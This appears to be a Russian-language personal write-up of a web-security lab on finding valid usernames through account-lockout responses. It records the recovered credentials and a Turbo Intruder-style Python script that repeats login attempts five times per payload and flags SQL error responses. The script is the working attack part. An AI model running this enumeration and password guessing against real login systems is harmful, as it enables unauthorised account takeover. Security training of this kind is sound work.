нужно найти сущес-щие логины!

если после неудачн попыток входа происходит блок учетной записи - то можно вооспользоваться этим по смс от сервера о блокировке понять что учетка такая существет

# Перечисление имен пользователей с помощью блокировки учетной записи
<img src="../../assets/Снимок-18.10.28.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
auto  - ЛОГИН
<img src="../../assets/Снимок-18.13.45.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />

 ПАРОЛЬ - joshua 

заметил что если ник валидный - то каждый 5 запрос - происходит блокировка ника этого (ак-та)

но если ник несущест-й - тогда и блока нет!
# СУТЬ
нужно найти сущес-щие логины!



каждый ник проверил по 5 запросов с неправильным паролем
и для тех ников которые нерабочие ответ не менялся
для существуюзих ников на 5й попытке был забанен акк на 1мин

вычислил что ак сузествует
потом просто подобрал пароль к нему и все!

==ВЫПОЛНЕНО==

скрипт проверит каждый ник , 5 попыток входа
```python
import random

import time

try:

    from urllib.parse import quote

except ImportError:

    from urllib import quote

  

  

def queueRequests(target, wordlists):

    MIN_DELAY = 40  # минимальная задержка в миллисекундах

    MAX_DELAY = 120  # максимальная задержка в миллисекундах

  

    engine = RequestEngine(endpoint=target.endpoint,

                          concurrentConnections=1,

                          requestsPerConnection=100,

                          pipeline=False)

  

    payloads = [

    "123456",

    "password",

    "12345678"

    ]

  

    for payload in payloads:

        # URL-кодируем только то, что пойдет в URL

        encoded_payload = quote(payload, safe='')

        final_request = target.req.replace('%s', encoded_payload)

        # Отправляем каждый пейлоад 5 раз подряд

        for attempt in range(5):

            delay_ms = random.randint(MIN_DELAY, MAX_DELAY)

            time.sleep(delay_ms / 1000.0)

            engine.queue(final_request)

  

  

def handleResponse(req, interesting):

    # Если автоматическое определение интересных ответов активно

    if interesting:

        req.label = "INTER"

        table.add(req)

    # Дополнительная проверка на SQL ошибки

    elif req.status == 500:

        response_text = req.response.lower()

        sql_indicators = ['sql', 'syntax', 'mysql', 'database', 'error', 'exception', 'warning']

        if any(indicator in response_text for indicator in sql_indicators):

            req.label = "POTENTIAL SQLi"

            table.add(req)

    # Для отладки можно раскомментировать:

    # else:

    #     table.add(req)
```
# УСТРАНЕНИЕ ПРОБЛЕМЫ


